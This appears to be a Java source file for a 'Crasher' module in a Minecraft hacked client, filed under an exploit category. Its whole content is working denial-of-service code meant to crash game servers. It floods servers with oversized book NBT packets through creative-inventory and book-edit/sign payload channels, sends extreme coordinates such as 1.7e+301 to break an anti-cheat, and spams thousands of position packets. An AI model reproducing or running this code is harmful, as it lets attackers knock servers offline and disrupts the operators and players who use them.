package vip.Resolute.modules.impl.exploit;

import vip.Resolute.events.Event;
import vip.Resolute.events.impl.EventUpdate;
import vip.Resolute.modules.Module;
import vip.Resolute.settings.impl.ModeSetting;
import vip.Resolute.settings.impl.NumberSetting;
import vip.Resolute.util.misc.TimerUtil;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.network.play.client.C17PacketCustomPayload;

import java.util.Random;

public class Crasher extends Module {
    public ModeSetting mode = new ModeSetting("Mode", "Book", "Book", "Item", "Position", "Fly", "AAC5");

    public NumberSetting interval = new NumberSetting("Interval", 1.0, this::isModeSelected, 1.0, 10.0, 1.0);
    public NumberSetting posDelay = new NumberSetting("Position Delay", 150, this::isMode2Selected, 5, 2000, 5);

    TimerUtil timerUtil = new TimerUtil();

    public Crasher() {
        super("Crasher", 0, "Crashes some servers", Category.EXPLOIT);
        this.addSettings(mode, interval, posDelay);
    }

    public boolean isModeSelected() {
        return this.mode.is("Book");
    }

    public boolean isMode2Selected() {
        return this.mode.is("Position");
    }

    public void onEvent(Event e) {
        if(e instanceof EventUpdate) {
            if(mode.is("Item")) {
                ItemStack book = new ItemStack(Items.writable_book);
                NBTTagList list = new NBTTagList();
                NBTTagCompound tag = new NBTTagCompound();
                String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                for (int i = 0; i < 50; i++) {
                    String siteContent = size;
                    NBTTagString tString = new NBTTagString(siteContent);
                    list.appendTag(tString);
                }
                tag.setString("author", "peepee");
                tag.setString("title", "poopoo");
                tag.setTag("pages", list);
                book.setTagInfo("pages", list);
                book.setTagCompound(tag);
                for (int i = 0; i < 100; i++) {
                    try {
                        mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(0, book));
                    } catch (Exception eex) {
                        eex.printStackTrace();
                    }
                }
            }

            if(mode.is("AAC5")) {
                mc.getNetHandler().sendPacketNoEvent(new C03PacketPlayer.C04PacketPlayerPosition(1.7e+301, -999.0, 0.0, true));
            }

            if(mode.is("Fly")) {
                final double playerX = this.mc.thePlayer.posX;
                final double playerY = this.mc.thePlayer.posY;
                final double playerZ = this.mc.thePlayer.posZ;
                double y = 0.0;
                final double x = 0.0;
                double z = 0.0;
                for (int i = 0; i < 200; ++i) {
                    y = i * 9;
                    this.mc.thePlayer.sendQueue.sendPacketNoEvent(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ, false));
                }
                for (int i = 0; i < 10000; ++i) {
                    z = i * 9;
                    this.mc.thePlayer.sendQueue.sendPacketNoEvent(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ + z, false));
                }
            }

            if(mode.is("Book")) {
                int j;
                if (Minecraft.getDebugFPS() >= 5) {
                    ItemStack bookStack = new ItemStack(Items.writable_book);
                    NBTTagCompound bookCompound = new NBTTagCompound();
                    bookCompound.setString("author", this.randomNumber(20));
                    bookCompound.setString("title", this.randomNumber(20));
                    NBTTagList pageList = new NBTTagList();
                    String pageText = this.randomNumber(600);
                    int i;
                    for (i = 0; i < 49; i++)
                        pageList.appendTag((NBTBase)new NBTTagString(pageText));
                    bookCompound.setTag("pages", (NBTBase)pageList);
                    bookStack.setTagCompound(bookCompound);
                    for (i = 0; i < 99 * this.interval.getValue(); i++) {
                        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                        packetBuffer.writeItemStackToBuffer(bookStack);
                        this.mc.getNetHandler().addToSendQueue((Packet)new C17PacketCustomPayload((new Random()).nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
                    }
                    return;
                }
            }

            if(mode.is("Position")) {
                if(timerUtil.hasElapsed((long) posDelay.getValue())) {
                    mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + randDouble(500, 1000), mc.thePlayer.posX + randDouble(500, 1000), mc.thePlayer.posZ + randDouble(500, 1000), mc.thePlayer.onGround));
                }
            }
        }
    }

    public double randDouble(double bound1, double bound2) {
        double min = Math.min(bound1, bound2);
        double max = Math.max(bound1, bound2);
        return min + (Math.random() * (max - min));
    }

    public static String randomNumber(int length) {
        return random(length, "123456789");
    }


    public static String random(int length, String chars) {
        return random(length, chars.toCharArray());
    }

    public static String random(int length, char[] chars) {
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < length; i++)
            stringBuilder.append(chars[(new Random()).nextInt(chars.length)]);
        return stringBuilder.toString();
    }
}
